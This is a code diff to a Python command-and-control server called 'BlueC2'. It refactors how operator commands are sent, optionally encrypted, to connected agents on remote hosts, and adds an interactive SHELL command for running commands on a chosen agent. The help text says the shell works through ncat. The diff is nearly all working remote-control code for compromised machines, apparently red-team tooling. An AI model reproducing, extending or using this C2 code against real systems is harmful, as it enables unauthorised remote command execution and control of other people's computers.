@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket,threading,re,logging,platform,os,time
+import socket,threading,re,logging,platform,os
 from datetime import datetime
 from agent import Agent
 from cryptography.fernet import Fernet
@@ -73,25 +73,8 @@ class BlueServer:
         elif splits[0].upper() == "CMD":
             cmd = ' '.join(splits[1:])
             cmd = cmd.strip()
-            cmd = "cmd|"+cmd
             for target in self.targets:
-                try:
-                    if self.encryption == True:
-                        target.sock.send(self.encrypt(cmd.encode()))
-                        reply = self.decrypt(target.sock.recv(65535)).decode()
-                        print(str(target),reply,sep="\n")
-                    else:
-                        target.sock.send(cmd.encode())
-                        reply = target.sock.recv(65535).decode()
-                        print(str(target),reply,sep="\n")
-                except UnicodeDecodeError:
-                    print(str(target)+"\nERROR: Unicode Decode Error")
-                except ConnectionResetError:
-                    print(str(target)+f"\nERROR: Connection reset\nBeacon got popped :(\nRemoving Agent #{target.number} from connection list\n")
-                    self.connections.remove(target)
-                    self.targets.remove(target)
-                except BrokenPipeError:
-                    print(str(target)+f"\nERROR: Broken pipe error\n")
+                self.send_cmd(cmd,target)
         elif userin.upper() in ["SHOW CONNECTIONS","SHOW CONNS"]:
             for conn in self.connections:
                 if conn != self.connections[-1]:
@@ -113,8 +96,41 @@ class BlueServer:
                     self.targets.remove(agent)
                 agent.sock.shutdown(socket.SHUT_RDWR)
                 agent.sock.close()
+        elif splits[0].upper() == "SHELL":
+            agent = self.agentnum_to_agent(splits[1])
+            if agent != None:
+                shell_in = ""
+                while shell_in not in ["quit", "exit","logout"]:
+                    shell_in = input("$ ")
+                    if shell_in in ["quit", "exit","logout"]:
+                        break
+                    splits = shell_in.split()
+                    cmd = shell_in.strip()
+                    self.send_cmd(cmd,agent)
+            else:
+                print("Invalid Agent")
         else:
             print("Command does not exist\n")
+
+    def send_cmd(self,cmd,agent):
+        cmd = "cmd|"+cmd
+        try:
+            if self.encryption == True:
+                agent.sock.send(self.encrypt(cmd.encode()))
+                reply = self.decrypt(agent.sock.recv(65535)).decode()
+                print(str(agent),reply,sep="\n")
+            else:
+                agent.sock.send(cmd.encode())
+                reply = agent.sock.recv(65535).decode()
+                print(str(agent),reply,sep="\n")
+        except UnicodeDecodeError:
+            print(str(agent)+"\nERROR: Unicode Decode Error")
+        except ConnectionResetError:
+            print(str(agent)+f"\nERROR: Connection reset\nBeacon got popped :(\nRemoving Agent #{agent.number} from connection list\n")
+            self.connections.remove(agent)
+            self.targets.remove(agent)
+        except BrokenPipeError:
+            print(str(agent)+f"\nERROR: Broken pipe error\n")
 
     def start(self):
         logging.info("BlueC2 server starting:"+self.get_timestamp())
@@ -152,7 +168,7 @@ class BlueServer:
         print("CMD <COMMAND>\tRuns a certain command on all selected targets")
         print("SHOW CONNECTIONS\tShows all connected agents")
         print("KILL <AGENT #>\tDisconnects specified agent")
-        #print("SHELL <Agent # or IP>\tOpens an interactive shell on agent with specified IP")
+        print("SHELL <Agent #>\tOpens an interactive shell on agent using ncat")
 
     def set_help(self):
         #Smaller help menu specific to the SET command
